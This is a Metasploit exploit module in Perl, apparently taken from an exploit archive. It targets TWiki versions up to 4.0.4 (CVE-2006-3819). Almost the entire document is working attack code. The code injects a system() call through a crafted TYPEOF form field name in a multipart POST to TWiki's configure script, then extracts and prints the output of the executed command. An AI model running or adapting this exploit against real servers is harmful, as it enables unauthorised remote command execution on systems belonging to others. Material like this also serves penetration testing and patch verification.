TWiki <= 4.0.4 (Configure Script) Remote Code Execution Exploit (meta)
======================================================================



##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::twiki_config_typeof;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { 
	&#039;HttpBoundary&#039; => [&#039;Mtb06z&#039;, &#039;HTTP boundary&#039;]
};

my $info = {
	&#039;Name&#039;     => &#039;Twiki Configure script TYPEOF Parameter Remote Command Execution&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.0 $&#039;,
	&#039;Authors&#039;  => [ &#039;David Maciejak <david dot maciejak at gmail dot com>&#039; ],
	&#039;Arch&#039;     => [ ],
	&#039;OS&#039;       => [ ],
	&#039;Priv&#039;     => 1,
	&#039;UserOpts&#039; =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 80],
		&#039;VHOST&#039; => [0, &#039;DATA&#039;, &#039;The virtual host name of the server&#039;],
		&#039;DIR&#039;   => [1, &#039;DATA&#039;, &#039;Directory of Twiki&#039;, &#039;/twiki&#039;],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Description&#039; => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution vulnerability in the
	Twiki configure script. All versions of Twiki prior to 
	4.0.4 hotfix 2 are vulnerable. Patch HotFix04x00x04x02 is available on twiki.org homepage.
}),
	&#039;Refs&#039; =>
	  [
		[&#039;BID&#039;, &#039;19188&#039;],
		[&#039;CVE&#039;, &#039;2006-3819&#039;],
		[&#039;OSVDB&#039;, &#039;27556&#039;],
	  ],

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039; => 128,
		&#039;Keys&#039;  => [&#039;cmd&#039;,&#039;cmd_bash&#039;],
	  },

	&#039;Keys&#039; => [&#039;twiki&#039;],

	&#039;DisclosureDate&#039; => &#039;Jul 27 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->VHost;
	my $target_port    = $self->GetVar(&#039;RPORT&#039;);
	my $dir            = $self->GetVar(&#039;DIR&#039;);
	my $encodedPayload = $self->GetVar(&#039;EncodedPayload&#039;);
	my $cmd            = $encodedPayload->RawPayload;
	my $boundary		 = $self->GetLocal(&#039;HttpBoundary&#039;);		

	$cmd=
		"\r\n--".$boundary."\r\n".
		"Content-Disposition: form-data; name=\"action\"\r\n\r\n".
		"update\r\n".
		"--".$boundary.
		"Content-Disposition: form-data; name=\"TYPEOF:{system(&#039;$cmd&#039;)}\"\r\n\r\n".
		"BOOLEAN\r\n".
		"--".$boundary;

	my $proto="http";
	if ($self->GetVar(&#039;SSL&#039;))
	{
		$proto.="s";
	}

	 my $request =
    	"POST ".$dir."/bin/configure HTTP/1.1\r\n".
		"Content-Type: multipart/form-data; boundary=".$boundary."\r\n".
		"User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.31-grsec i686)\r\n".
		"Host: $target_host\r\n".
		"Referer: ".$proto."://".$target_host.$dir."/bin/configure\r\n".
		"Accept: image/gif, image/x-xbitmap, image/jpeg, image/png\r\n".
		"Accept-Language: en\r\n".
		"Content-Length: ". length($cmd). "\r\n\r\n".
		$cmd;

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $target_host,
		&#039;PeerPort&#039; => $target_port,
		&#039;SSL&#039;      => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError){
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$s->Send($request);

	my $results = $s->Recv(-1, 200);

	if ($results=~ /^transfer-encoding:[ \t]*chunked\b/im){
		my @extract_result;
		my @results = split ( /\r\n/, $results );

		chomp @results;
		my $fill_extract_result=0;
		my $end_break=0;
		my $i=0;
		while ( !$end_break && ($i < @results)){
			if ($results[$i] =~ /\<div id=\"patternScreen\"\>/)
			{
				$fill_extract_result=0;
				$end_break=1;
			}
			if ($fill_extract_result>0) {
					push(@extract_result,$results[$i]);
			}
			if ($results[$i] =~ /\<body class=\"patternNoViewPage\"\>/)
			{
				$fill_extract_result=1;
			}
			$i++;
		}

		if (@extract_result < 3) {
				$self->PrintLine("[*] Target may be not vulnerable, or you have used &#039;;&#039; char in CMD");	
		}
		else {
			for ($i=1;$i<@extract_result;$i+=2) {
				chomp @extract_result;
				$self->PrintLine("$extract_result[$i]");
			}
		}
	}

	$s->Close();
	return;
}

sub VHost {
	my $self = shift;
	my $name = $self->GetVar(&#039;VHOST&#039;) || $self->GetVar(&#039;RHOST&#039;);
	return $name;
}

1;



